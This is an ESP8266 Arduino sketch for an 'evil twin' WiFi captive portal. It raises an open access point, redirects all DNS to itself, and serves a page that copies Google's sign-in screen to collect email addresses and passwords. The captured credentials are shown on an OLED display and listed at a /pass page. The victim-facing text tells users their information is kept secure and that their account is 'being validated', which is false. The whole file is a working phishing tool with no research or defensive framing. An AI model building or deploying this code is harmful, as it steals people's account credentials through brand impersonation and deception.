// ESP8266 WiFi Captive Portal with OLED Display
#include <ESP8266WiFi.h>
#include <DNSServer.h> 
#include <ESP8266WebServer.h>
#include <U8g2lib.h>

// User configuration
#define SSID_NAME "As33b"
#define SUBTITLE "User Authentication"
#define TITLE "Sign in"
#define BODY "To access the internet, please sign in with your email and password. Your information is kept secure and private."
#define POST_TITLE "Validating..."
#define POST_BODY "<p>Your account is being validated. Please wait for device connection.</p><div id=\"countdown\">10</div><script>let timeLeft=10;const countdownElem=document.getElementById('countdown');const interval=setInterval(()=>{timeLeft--;countdownElem.textContent=timeLeft;if(timeLeft<=0){clearInterval(interval);window.location='/success';}},1000);</script><p>Thank you.</p>"
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"

// Initialize the OLED display (I2C)
U8G2_SH1106_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, /* reset=*/ U8X8_PIN_NONE);

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
IPAddress APIP(172, 0, 0, 1); // Gateway

String Credentials = "";
DNSServer dnsServer; 
ESP8266WebServer webServer(80);

// Input sanitization
String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

// Email validation
bool isValidEmail(String email) {
  int atIdx = email.indexOf('@');
  int dotIdx = email.lastIndexOf('.');
  return (atIdx > 0 && dotIdx > atIdx && dotIdx < email.length() - 1);
}

// HTML header
String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: linear-gradient(to right, #6a11cb, #2575fc); color: #fff; text-align: center; }"
    "header { background: rgba(0, 0, 0, 0.8); color: white; padding: 1em; text-align: center; font-size: 1.5em; }"
    "main { max-width: 600px; margin: 2em auto; padding: 2em; background: rgba(255, 255, 255, 0.8); color: #333; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3); text-align: left; }"
    "h1 { font-size: 1.8em; margin-bottom: 1em; color: #333; }"
    "p { margin-bottom: 1em; }"
    "form { display: flex; flex-direction: column; }"
    "label { margin-bottom: 0.5em; font-weight: bold; }"
    "input { padding: 0.75em; margin-bottom: 1em; border: 1px solid #ccc; border-radius: 4px; font-size: 1em; }"
    "input[type=text], input[type=password] { font-size: 1em; padding: 0.75em; border-radius: 5px; border: 1px solid #aaa; }"
    "input[type=submit] { background: #28a745; color: white; border: none; cursor: pointer; transition: background 0.3s; }"
    "input[type=submit]:hover { background: #218838; }"
    "footer { text-align: center; margin-top: 2em; font-size: 0.9em; color: #666; }";

  String h = "<!DOCTYPE html><html><head><title>" + a + " :: " + t + "</title>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>" + CSS + "</style></head><body><header>" + a + "</header><main><h1>" + t + "</h1>";
  return h;
}

// Display credentials on OLED
void displayCredentials(String email, String password) {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr); // Using a smaller font

  // Display title
  u8g2.drawStr(0, 10, "Last Credentials:");
  u8g2.drawStr(0, 20, "-----------------");

  // Define the maximum width for a single line
  int maxWidth = 128; // Width of the SH1106 display
  int charWidth = 6;  // Width of a single character in pixels (depends on the font)
  int maxCharsPerLine = maxWidth / charWidth;

  // Split email and password into multiple lines if necessary
  String emailLabel = "Email: ";
  String passwordLabel = "Pass: ";
  String formattedEmail = emailLabel + email;
  String formattedPassword = passwordLabel + password;

  // Function to split text into lines
  auto wrapText = [&](String text, int indentLength) -> std::vector<String> {
    std::vector<String> lines;
    int availableWidth = maxCharsPerLine - indentLength; // Adjust for indent on subsequent lines
    lines.push_back(text.substring(0, maxCharsPerLine)); // First line

    text = text.substring(maxCharsPerLine);
    while (text.length() > availableWidth) {
      lines.push_back(text.substring(0, availableWidth));
      text = text.substring(availableWidth);
    }
    if (text.length() > 0) {
      lines.push_back(text);
    }
    return lines;
  };

  // Get wrapped lines for email and password
  std::vector<String> emailLines = wrapText(formattedEmail, emailLabel.length());
  std::vector<String> passwordLines = wrapText(formattedPassword, passwordLabel.length());

  // Display wrapped text
  int yPos = 30; // Starting Y position for text display
  for (size_t i = 0; i < emailLines.size(); ++i) {
    int xPos = (i == 0) ? 0 : emailLabel.length() * charWidth;
    u8g2.drawStr(xPos, yPos, emailLines[i].c_str());
    yPos += 10; // Move down to the next line
  }
  for (size_t i = 0; i < passwordLines.size(); ++i) {
    int xPos = (i == 0) ? 0 : passwordLabel.length() * charWidth;
    u8g2.drawStr(xPos, yPos, passwordLines[i].c_str());
    yPos += 10; // Move down to the next line
  }

  // Send buffer to the display
  u8g2.sendBuffer();
}

// Blink LED
void BLINK() {
  for (int i = 0; i < 5; i++) {
    digitalWrite(BUILTIN_LED, LOW);
    delay(500);
    digitalWrite(BUILTIN_LED, HIGH);
    delay(500);
  }
}

// Web pages
String index() {
  String page = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>"
                "<title>Sign in - Google Accounts</title>"
                "<style>"
                "body { font-family: Roboto, sans-serif; background: #f2f2f2; margin: 0; padding: 0; }"
                ".container { max-width: 400px; margin: 80px auto; background: white; padding: 40px 30px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.2); }"
                ".logo { text-align: center; margin-bottom: 20px; }"
                ".logo img { height: 40px; }"
                "h1 { font-weight: 400; font-size: 24px; color: #202124; margin-bottom: 10px; }"
                "p { color: #5f6368; font-size: 14px; }"
                "input[type='text'], input[type='password'] { width: 100%; padding: 12px; margin-top: 10px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }"
                "input[type='submit'] { width: 100%; padding: 12px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; }"
                "input[type='submit']:hover { background-color: #1765c1; }"
                ".footer { text-align: center; margin-top: 20px; font-size: 12px; color: #999; }"
                "</style></head><body>"
                "<div class='container'>"
                "<div class='logo'><img src='https://www.gstatic.com/images/branding/product/1x/googleg_32dp.png'></div>"
                "<h1>Sign in</h1>"
                "<p>to continue to the internet</p>"
                "<form action='/post' method='post' onsubmit='return validateEmail()'>"
                "<input type='text' id='email' name='email' placeholder='Email or phone'>"
                "<input type='password' id='password' name='password' placeholder='Enter your password'>"
                "<input type='submit' value='Next'>"
                "</form>"
                "<div class='footer'>&copy; 2024 As33b</div>"
                "</div>"
                "<script>"
                "function validateEmail() {"
                "var email = document.getElementById('email').value;"
                "var pass = document.getElementById('password').value;"
                "const regex = /^\\S+@\\S+\\.\\S+$/;"
                "if (!regex.test(email)) { alert('Please enter a valid email.'); return false; }"
                "if (pass.trim() === '') { alert('Password cannot be blank.'); return false; }"
                "return true;"
                "}"
                "</script>"
                "</body></html>";
  return page;
}


String posted() {
  String email = input("email");
  String password = input("password");
  if (!isValidEmail(email)) {
    return header("Invalid Email") + "<p>Invalid email format. Please go back and try again.</p><a href=/\">Back to Index</a></main><footer>&copy;2024 As33b. Your Gateway to Secure and Private Solutions.</footer></body></html>";
  }
password.trim(); // Ensure any leading/trailing spaces are removed
if (password == "") {
    return header("Invalid Password") + "<p>Password cannot be blank. Please go back and try again.</p><a href=/>Back to Index</a></main><footer>&copy; 2024 As33b</footer></body></html>";
}


  Credentials = "<li>Email: <b>" + email + "</b><br>Password: <b>" + password + "</b></li>" + Credentials;
  displayCredentials(email, password);
  return header(POST_TITLE) + POST_BODY + "</main><footer>&copy; 2024 As33b. Your Gateway to Secure and Private Solutions..</footer></body></html>";
}

String clear() {
  Credentials = "";
  displayCredentials("", "");
  return header(CLEAR_TITLE) + "Credentials cleared.<br><a href=/\">Back to Index</a></main><footer>&copy; 2024 As33b. Your Gateway to Secure and Private Solutions.</footer></body></html>";
}
void setup() {
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);

  dnsServer.start(DNS_PORT, "*", APIP);

  webServer.on("/", []() { webServer.send(HTTP_CODE, "text/html", index()); });
  webServer.on("/post", []() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
  webServer.on("/clear", []() { webServer.send(HTTP_CODE, "text/html", clear()); });
  webServer.on("/pass", []() { 
    String response = header(PASS_TITLE) + "<ul>" + Credentials + "</ul></main><footer>&copy; 2024 As33b. Your Gateway to Secure and Private Solutions.</footer></body></html>";
    webServer.send(HTTP_CODE, "text/html", response);
  });
  webServer.onNotFound([]() { webServer.send(HTTP_CODE, "text/html", index()); });

  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);

  // Initialize OLED
  u8g2.begin();
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_ncenB08_tr);
  u8g2.drawStr(0, 20, "Captive Portal Started");
  u8g2.drawStr(0, 40, "SSID: The As33b ");
  u8g2.drawStr(20, 53, "          PWener");
  u8g2.sendBuffer();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
